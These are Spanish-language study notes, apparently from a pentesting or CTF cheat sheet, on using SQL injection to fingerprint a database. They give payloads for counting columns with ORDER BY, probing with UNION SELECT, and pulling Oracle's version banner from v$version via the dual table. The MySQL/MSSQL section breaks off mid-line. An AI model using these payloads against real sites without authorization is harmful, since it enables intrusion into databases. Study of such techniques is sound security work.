## Identificación de versión y motor de base de datos
#### ORACLE
Identificar el numero de columnas
`' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select 'a','b'-- -`, no mostrarnos nada nos esta dando una pista de que puede ser una base de datos ORACLE para ello deberemos referenciar a una tabla
`' union select 'a','b' from dual-- -`, dual es una tabla que esta siempre presente en las beses de datos de ORACLE

Para extraer la versión
`' union select 'a',banner from v$version-- -`, nos devolverá toda la información de la base de datos

#### MySQL y MSSQL
Identificar el numero de columnas
`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con u
`' union select 'a','b'-- -`